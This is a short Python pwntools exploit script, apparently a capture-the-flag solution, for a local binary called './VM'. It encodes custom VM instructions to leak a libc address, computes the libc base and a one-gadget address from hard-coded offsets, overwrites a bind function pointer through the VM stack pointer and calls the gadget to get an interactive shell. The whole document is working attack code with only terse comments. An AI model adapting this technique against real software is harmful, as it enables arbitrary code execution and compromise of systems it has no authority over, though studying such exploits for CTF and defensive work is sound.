from pwn import *

r = process("./VM")

def inst(inst, arg1, arg2, arg3, val):
	p = (inst<<28) | (arg1<<26) | (arg2<<23) | (arg3<<20) | (0xf<<16) | val
	return hex(p)[2:].zfill(8)

r.sendline(inst(5, 0, 1, 2, 0)*50) # xchg R1, R2 = 0, to get libc addr from cin()
r.sendline(inst(1, 1, 7, 0, 0x4320)) # move sack to ptr stores libc addr
r.sendline(inst(0, 3, 0, 0, 0)) # get libc

print r.recvuntil("0x4320 ")

libc = 0x0

for i in range(6):
	val = int(r.recvuntil(" ")[:-1], 16)
	libc += val * 256**i

print "libc: " + hex(libc)

libc_base = libc - 0x3c1c58
one_gadget = libc_base + 0x4557a # get one-gadget addr

r.sendline(inst(1, 1, 7, 0, 0x4138)) # set SP to bind function ptr

r.sendline(inst(8, 3, 0, 0, 0x0)) # push 0x0
r.sendline(inst(8, 3, 0, 0, one_gadget>>32))
r.sendline(inst(8, 3, 0, 0, (one_gadget>>16)&0xffff))
r.sendline(inst(8, 3, 0, 0, one_gadget&0xffff)) # push one_gadget

r.sendline(inst(1, 1, 0, 0, 0x1)) # R0 = 1 to call bind

r.sendline(inst(10, 3, 0, 0, 0)) # call one_gadget

r.interactive()
